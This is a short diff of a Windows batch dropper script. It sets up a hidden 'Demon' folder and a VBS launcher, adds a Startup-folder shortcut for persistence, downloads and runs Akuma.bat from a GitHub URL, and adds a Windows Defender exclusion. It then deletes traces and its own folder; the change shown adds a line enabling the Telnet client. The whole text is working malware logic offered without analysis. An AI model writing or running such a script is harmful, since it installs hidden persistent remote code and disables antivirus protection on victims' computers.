@@ -11,6 +11,7 @@ echo objShell.Run "%homedrive%\Demon\Demon.bat", 0, False >> %homedrive%\Demon\1
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Demon.lnk');$s.TargetPath='%homedrive%\Demon\Demon.vbs';$s.Save()"
 curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\Demon.bat
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Demon\Demon.bat
+echo powershell Enable-WindowsOptionalFeature -FeatureName "TelnetClient" -Online >> %homedrive%\Demon\Demon.bat
 echo del %appdata%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Amuka.lnk >> %homedrive%\Demon\Demon.bat
 echo %homedrive%\Demon\Akuma.bat >> %homedrive%\Demon\Demon.bat
 echo rmdir /s /q %homedrive%\Demon >> %homedrive%\Demon\Demon.bat
